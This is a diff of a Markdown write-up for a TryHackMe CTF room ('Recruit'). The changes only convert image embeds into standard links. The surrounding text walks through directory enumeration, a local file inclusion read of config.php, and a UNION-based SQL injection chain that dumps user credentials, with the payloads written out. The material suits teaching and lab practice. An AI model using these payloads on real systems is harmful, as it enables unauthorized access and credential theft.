@@ -25,23 +25,23 @@ Visiting `http://TARGET_IP` presents a login page. There's a footer including a 
 Basic authentication bypass payloads such as `' OR 1=1--` and `admin'--` did not succeed, suggesting the login form was not vulnerable to [[SQLi]].
 ## 1.2 [[Gobuster]] Directory Enumeration
 run `gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt,bak,js`
-![[Pasted image 20260729181219.png]]
+![gobuster-scan.png](Screenshots/gobuster-scan.png)
 ## 1.3 sitemap enumeration
 visit http://TARGET_IP/sitemap.xml
-![[Pasted image 20260806191258.png]]
-![[Pasted image 20260806191337.png]]
+![sitemap1.png](sitemap1.png)
+![sitemap2.png](Screenshots/sitemap2.png)
 
 Visiting http://TARGET_IP/mail we find mail.log. This includes sensitive info
-![[Pasted image 20260806191608.png]]
+![mail log.png](Screenshots/mail%20log.png)
 ## 2. Exploiting Local File Inclusion
 The `file.php` endpoint allows reading local files using the `file://` wrapper.
 visit 
 `http://TARGET_IP/file.php?cv=file:///var/www/html/config.php`
 
-![[Pasted image 20260806191646.png]]
+![LFI.png](Screenshots/LFI.png)
 # 3. Initial Access
 Using the recovered HR credentials, we log in, receiving the first flag.
-![[Pasted image 20260729182757.png]]
+![Initial access.png](Screenshots/Initial%20access.png)
 After logging in as the HR user, the candidate search functionality accepted user input directly and became the next target for testing.
 # 4. [[SQLi]] in search field
 1. **Test for SQL injection**
@@ -49,7 +49,7 @@ After logging in as the HR user, the candidate search functionality accepted use
 '
 ```
 A single quote (`'`) is commonly used to test whether user input is being inserted directly into an SQL query. If the application returns a syntax error, it suggests the input is not being properly escaped or parameterized.
-![[Pasted image 20260729183326.png]]
+![Testing SQLi.png](Screenshots/Testing%20SQLi.png)
 2. **Find the number of columns**
    - Use `UNION SELECT NULL;--.
    - Increase the number of `NULL` values in the `UNION SELECT` statement until the query executes successfully. The successful payload indicates the correct number of columns.
@@ -59,29 +59,29 @@ A single quote (`'`) is commonly used to test whether user input is being insert
 ' UNION SELECT null,null,null,database();-- 
 ```
    **Result:** `recruit_db`
-![[Pasted image 20260729183549.png]]
+![recruit_db.png](Screenshots/recruit_db.png)
 4. **Enumerate table names**
 ```sql
 ' UNION SELECT null,null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema='recruit_db';-- 
 ```
    **Result:** `candidates, users`
-![[Pasted image 20260729183756.png]]
+![tables.png](Screenshots/tables.png)
 5. **Enumerate column names in the `users` table**
 ```sql
 ' UNION SELECT null,null,null,group_concat(column_name) FROM information_schema.columns WHERE table_schema='recruit_db' AND table_name='users';-- 
 ```
    **Result:** `id, password, username`
-![[Pasted image 20260729183834.png]]
+![columns.png](Screenshots/columns.png)
 6. **Extract credentials**
 ```sql
 ' UNION SELECT null,null,null,group_concat(concat(username, ':', password)) FROM users;-- 
 ```
    **Result:** admin's credentials
-   ![[Pasted image 20260729183946.png]]
+   ![admin credentials.png](Screenshots/admin%20credentials.png)
 
 # Privilege Escalation
 Using the extracted administrator credentials, log in to the admin account to obtain the second flag.
-![[Pasted image 20260729184155.png]]
+![admin flag.png](OffSec/Write%20ups/tryhackme/Recruit/Screenshots/admin%20flag.png)
 
 # Lessons Learned
 
